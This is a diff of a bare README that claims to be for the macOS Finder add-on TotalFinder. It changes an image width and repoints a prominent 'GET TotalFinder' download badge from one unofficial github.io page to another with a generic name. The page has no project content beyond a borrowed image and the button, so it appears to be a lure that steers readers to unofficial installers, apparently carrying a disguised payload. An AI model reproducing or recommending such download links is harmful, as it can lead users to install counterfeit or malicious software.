@@ -1,13 +1,13 @@
 # TotalFinder – Smart Finder Upgrade and File Management Tool  
 
 <div align="center">  
-<img src="https://www.imymac.com/images/cover-image/uninstall-totalfinder.jpg" alt="TotalFinder Logo" width="900">  
+<img src="https://www.imymac.com/images/cover-image/uninstall-totalfinder.jpg" alt="TotalFinder Logo" width="700">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/totalfinder">  
+<a href="https://install-quick-software.github.io/.github/totalfinder">  
 <img src="https://img.shields.io/badge/💻_GET_TotalFinder-orange?style=for-the-badge&logo=apple" alt="GET TotalFinder">  
 </a>  
 </div>
